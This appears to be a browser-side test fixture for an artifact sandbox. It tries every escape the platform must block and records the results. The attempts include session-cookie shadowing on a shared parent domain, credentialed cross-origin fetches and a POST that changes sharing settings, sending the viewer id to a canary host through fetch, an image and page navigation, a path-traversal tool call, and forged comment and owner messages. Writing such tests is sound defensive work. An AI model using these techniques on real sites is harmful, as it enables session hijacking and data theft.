// Adversarial artifact: tries everything DoD 3 says it must not be able to do
// and writes the outcome of each attempt into #results (JSON). The test asserts on these and on server-side state.
const APP = location.ancestorOrigins[0]; // the shell's origin (the app host)
const CANARY = "https://127.0.0.1:__CANARY_PORT__"; // the test's canary host (port filled in at publish): it must log nothing
const art = window.artifact, out = {};
const settle = (p, ms = 3000) => Promise.race([p, new Promise((r) => setTimeout(() => r("timeout"), ms))]);
const tryFetch = (u, init) => settle(fetch(u, init).then(async (r) => `fetched ${r.status} ${(await r.text()).slice(0, 80)}`, (e) => `blocked: ${e.name}`));

await art.ready;
out.viewer = art.viewer;

// 1. cookies: read; then try to set or shadow the session cookie (the test checks the app's cookie jar afterwards)
out.cookie = document.cookie;
const appHost = new URL(APP).hostname;
// the shared parent domain of both hosts (production: <tailnet>.ts.net): a cookie set for it reaches the app host too
const ah = appHost.split("."), ch = location.hostname.split(".");
let n = 0; while (n < Math.min(ah.length, ch.length) && ah[ah.length - 1 - n] === ch[ch.length - 1 - n]) n++;
const site = ah.slice(ah.length - n).join(".");
out.sharedParentDomain = site;
for (const c of ["__Host-session=evil1; Secure; Path=/", `__Host-session=evil2; Secure; Path=/; Domain=${appHost}`,
  `session=evil3; Path=/; Domain=${appHost}`, `__Host-session=evil4; Path=/; Domain=${location.hostname}`,
  `__Host-session=evil5; Secure; Path=/; Domain=${site}`, `__Secure-session=evil6; Secure; Path=/; Domain=${site}`,
  `session=evil7; Secure; Path=/; Domain=${site}`]) { try { document.cookie = c; } catch {} }
out.cookieOwnJarAfterWrites = document.cookie; // the content host's own jar, never the app's

// 2. network (CSP connect-src 'none' etc.)
out.fetchSelf = await tryFetch("/_sdk/artifact-sdk.js");
out.fetchAppMe = await tryFetch(APP + "/api/me", { credentials: "include" });
out.fetchAppPost = await tryFetch(APP + "/api/artifacts/x/sharing", { method: "POST", mode: "no-cors", credentials: "include", body: '{"mode":"link"}' });
out.fetchCanary = await tryFetch(CANARY + "/fetch?data=" + encodeURIComponent(art.viewer.id), { mode: "no-cors" });
out.websocketComments = await settle(new Promise((r) => {
  try { const ws = new WebSocket(APP.replace("http", "ws") + "/api/rooms/" + location.pathname.split("~")[0].split("/c/")[1] + "/comments"); ws.onopen = () => r("OPEN"); ws.onerror = () => r("blocked: error"); }
  catch (e) { r("blocked: " + e.name); }
}));
out.image = await settle(new Promise((r) => { const i = new Image(); i.onload = () => r("loaded"); i.onerror = () => r("blocked: error"); i.src = CANARY + "/img?data=" + encodeURIComponent(art.viewer.id); }));

// 3. popups and the top window
out.popup = (() => { try { const w = window.open("https://example.com/", "_blank"); return w ? "OPENED" : "null"; } catch (e) { return "blocked: " + e.name; } })();
out.parentDom = (() => { try { return "READ " + parent.document.title; } catch (e) { return "blocked: " + e.name; } })();

// 4. tools: undeclared (refused by the platform) vs the declared owner query (passes the manifest check). No viewer tool: DoD 6
// would make this page's room read-only, and check 6 needs it to write
out.toolUndeclared = await art.tools.call("undeclared_tool", {});
out.ownerToolOwnArgs = await art.tools.call("owner_query", { q: "something else" }); // owner tools run their pinned args only
out.ownerToolPinned = await art.tools.call("owner_query");
const raw = window.__ports.at(-1);
const rawCall = (msg) => new Promise((r) => { const h = (e) => { if (e.data.kind === "tools.result" && e.data.id === msg.id) { raw.removeEventListener("message", h); r(e.data.result); } }; raw.addEventListener("message", h); raw.start(); raw.postMessage(msg); });
out.toolRaw = raw ? await settle(rawCall({ kind: "tools.call", id: 9001, tool: "../tools/other/declared_tool", args: {} })) : "no port";

// 5. comments room: every way the shell protocol could be bent
raw?.postMessage({ kind: "comments.send", msg: { type: "comment", id: "evil-1", text: "EVIL via comments.send" } });
raw?.postMessage({ kind: "room.send", room: "comments", msg: { type: "comment", id: "evil-2", text: "EVIL via room field" } });
parent.postMessage({ kind: "room.send", room: "comments", msg: { type: "comment", id: "evil-3", text: "EVIL via window" } }, "*");
out.commentsAttempted = true;

// 6. impersonation in the app room: the server must stamp `from` with this viewer's id
art.room.send({ type: "note", text: "impersonation by " + art.viewer.id, from: "owner", seq: 999999, ts: 1 });
const log = [];
art.room.onMessage((m) => { if (m.type === "history") log.splice(0, log.length, ...m.messages); else log.push(m); document.getElementById("roomlog").textContent = JSON.stringify(log); });

document.getElementById("results").textContent = JSON.stringify(out);
window.__results = out;

// top navigation on demand (a successful one would unload the page under test before its results are read)
document.getElementById("topnav").onclick = () => {
  let r; try { top.location.href = "https://example.com/"; r = "NO ERROR"; } catch (e) { r = "blocked: " + e.name; }
  document.getElementById("topnav-result").textContent = r;
};

// residual risk: the frame navigates itself, carrying data in the URL (no CSP control exists for this)
document.getElementById("nav").onclick = () => { location.href = CANARY + "/leak?data=" + encodeURIComponent(JSON.stringify({ viewer: art.viewer.id, items: log.length })); };
document.getElementById("navapp").onclick = () => { location.href = APP + "/api/me?from-artifact=1"; };
